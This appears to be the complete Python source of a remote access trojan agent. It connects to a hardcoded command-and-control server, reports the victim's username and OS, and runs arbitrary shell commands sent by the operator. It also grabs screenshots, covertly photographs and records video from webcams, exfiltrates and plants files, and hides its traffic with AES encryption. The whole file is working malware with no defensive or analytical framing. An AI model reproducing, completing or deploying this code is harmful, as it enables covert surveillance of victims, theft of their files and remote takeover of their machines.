import socket
import json
import threading
import base64
import os
import time
import platform
import subprocess
import io
import mss
import cv2
from PIL import Image
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

SECRET_KEY = b'0123456789abcdef0123456789abcdef'
C2_SERVER_IP = "192.168.1.20"
C2_SERVER_PORT = 9090

def encrypt_message(message: str) -> bytes:
    iv = os.urandom(16)
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(message.encode(), AES.block_size))
    return base64.b64encode(iv + encrypted)

def decrypt_message(encrypted_message: bytes) -> str:
    raw = base64.b64decode(encrypted_message)
    iv = raw[:16]
    encrypted = raw[16:]
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(encrypted), AES.block_size).decode()

def send_packet(sock, message: str):
    encrypted = encrypt_message(message)
    size = str(len(encrypted)).zfill(10).encode()
    sock.send(size + encrypted)

def recv_packet(sock):
    size_data = b""
    while len(size_data) < 10:
        part = sock.recv(10 - len(size_data))
        if not part:
            return None
        size_data += part
    size = int(size_data.decode().strip())

    data = b""
    while len(data) < size:
        part = sock.recv(size - len(data))
        if not part:
            break
        data += part

    return decrypt_message(data)

def take_screenshot():
    with mss.mss() as sct:
        screenshot = sct.grab(sct.monitors[1])
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
        buffer = io.BytesIO()
        img.save(buffer, format='PNG')
        return base64.b64encode(buffer.getvalue()).decode("utf-8")

def list_webcams():
    available = []
    for i in range(5):
        cap = cv2.VideoCapture(i)
        if cap.read()[0]:
            available.append(i)
        cap.release()
    return ",".join(str(i) for i in available) if available else "None"

def take_photo(index):
    try:
        cam = cv2.VideoCapture(int(index))
        if not cam.isOpened():
            return "[!] Camera not available"
        ret, frame = cam.read()
        cam.release()
        if not ret or frame is None:
            return "[!] Failed to capture image"
        _, buffer = cv2.imencode('.jpg', frame)
        return base64.b64encode(buffer).decode('utf-8')
    except Exception:
        return "[!] Exception while capturing photo"


def video_webcam(index, duration=5, fps=5):
    try:
        cam = cv2.VideoCapture(int(index))
        if not cam.isOpened():
            return "[!] Camera not available"

        frames = []
        start = time.time()
        while time.time() - start < duration:
            ret, frame = cam.read()
            if ret and frame is not None:
                frames.append(frame)
            time.sleep(1 / fps)

        cam.release()
        if not frames:
            return "[!] No frames captured"

        h, w, _ = frames[0].shape
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter("video.mp4", fourcc, fps, (w, h))
        if not out.isOpened():
            return "[!] Error creating video writer"

        for frame in frames:
            out.write(frame)
        out.release()

        with open("video.mp4", "rb") as f:
            encoded = base64.b64encode(f.read()).decode("utf-8")
        os.remove("video.mp4")
        return encoded
    except Exception:
        return "[!] Exception while recordin video in webcam"


def download_file(path):
    if not os.path.exists(path):
        return None
    with open(path, "rb") as f:
        return base64.b64encode(f.read()).decode("utf-8")

def upload_file(data, name):
    try:
        with open(name, "wb") as f:
            f.write(base64.b64decode(data))
        return True
    except:
        return False

def heartbeat_loop(sock, agent_id):
    while True:
        packet = json.dumps({
            "type": "heartbeat",
            "agent_id": agent_id,
            "data": ""
        })
        try:
            send_packet(sock, packet)
        except:
            break
        time.sleep(30)

def handle_server(sock, agent_id):
    while True:
        try:
            msg = recv_packet(sock)
            if not msg:
                continue
            data = json.loads(msg)
            cmd_type = data.get("type")
            payload = data.get("data")

            if cmd_type == "command":
                try:
                    result = subprocess.check_output(payload, stderr=subprocess.STDOUT, shell=True, text=True)
                    result = result.strip() or "[No output]"
                except subprocess.CalledProcessError as e:
                    result = f"[!] Command failed: {e.output.strip()}"
                except Exception as e:
                    result = f"[!] Error: {e}"
                send_json(sock, "response", agent_id, result)

            elif cmd_type == "checkstatus":
                try:
                    result = subprocess.check_output("whoami", stderr=subprocess.STDOUT, shell=True, text=True)
                    if result:
                        result = "Online"
                    else:
                        result = "Offline"
                except Exception as e:
                    result = f"Offline"
                send_json(sock, "status", agent_id, result)

            elif cmd_type == "screenshot":
                image_b64 = take_screenshot()
                send_json(sock, "screenshot", agent_id, image_b64)

            elif cmd_type == "listwebcams":
                cams = list_webcams()
                send_json(sock, "response", agent_id, cams)

            elif cmd_type == "photo":
                photo = take_photo(payload)
                if not photo or photo.startswith("[!]"):
                    send_json(sock, "response", agent_id, photo or "[!] Error taking photo")
                else:
                    send_json(sock, "photo", agent_id, photo)


            elif cmd_type == "video":
                args = payload.split()
                index = int(args[0])
                duration = int(args[1]) if len(args) > 1 else 5
                fps = int(args[2]) if len(args) > 2 else 5
                video = video_webcam(index, duration, fps)
                if isinstance(video, str) and video.startswith("[!]"):
                    send_json(sock, "response", agent_id, video)
                else:
                    send_json(sock, "video", agent_id, video)


            elif cmd_type == "download":
                file_data = download_file(payload)
                if file_data:
                    send_json(sock, "file", agent_id, f"{file_data}|{payload}")
                else:
                    send_json(sock, "response", agent_id, "[!] File not found")

            elif cmd_type == "upload":
                try:
                    upload_info = json.loads(payload)
                    name = upload_info.get("filename", "uploaded.bin")
                    content = upload_info.get("content", "")
                    success = upload_file(content, name)
                    msg = "✅ File uploaded" if success else "❌ Upload failed"
                except Exception as e:
                    msg = f"❌ Upload failed: {e}"
                send_json(sock, "response", agent_id, msg)

            elif cmd_type == "kill":
                return True

        except Exception as e:
            break

def send_json(sock, type_, agent_id, data):
    msg = json.dumps({
        "type": type_,
        "agent_id": agent_id,
        "data": data
    })
    send_packet(sock, msg)

def connect_to_c2():
    while True:
        try:
            sock = socket.socket()
            sock.connect((C2_SERVER_IP, C2_SERVER_PORT))

            username = os.getlogin()
            os_version = platform.platform()
            agent_id = platform.node()

            info_msg = json.dumps({
                "type": "info",
                "agent_id": agent_id,
                "data": f"{username}|{os_version}"
            })
            send_packet(sock, info_msg)

            threading.Thread(target=heartbeat_loop, args=(sock, agent_id), daemon=True).start()
            should_exit = handle_server(sock, agent_id)
            if should_exit:
                break

        except Exception as e:
            time.sleep(10)

if __name__ == "__main__":
    connect_to_c2()
